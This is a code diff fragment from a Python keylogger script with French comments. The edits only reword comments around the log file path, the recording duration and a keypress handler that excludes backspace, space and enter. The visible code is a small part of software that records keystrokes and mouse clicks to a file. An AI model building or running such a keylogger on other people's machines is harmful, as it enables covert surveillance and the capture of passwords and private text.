@@ -29,7 +29,7 @@ file_path = os.path.join(documents_path, "keylogger.txt")
 if not os.path.exists(documents_path):
     os.makedirs(documents_path)
 
-# Durée d'enregistrement en secondes (X secondes)
+# Durée d'enregistrement en secondes
 record_duration = RECORD_DURATION
 
 # Temps de début d'enregistrement
@@ -120,8 +120,8 @@ template = """
 
 # Fonction appelée lorsqu'une touche ou un clic de souris est pressé
 def on_press(key):
-    global mouse_clicks  # Utilisez le mot-clé global pour accéder à la variable déclarée en dehors de la fonction
-    # Exclut les événements des touches "backspace", "espace" et "enter"
+    global mouse_clicks  # Mot-clé global pour accéder à la variable déclarée en dehors de la fonction
+    # Exclut les événements des touches "backspace", "espace", "enter" etc ...
     if key in [keyboard.Key.backspace,
                keyboard.Key.space,
                keyboard.Key.enter,
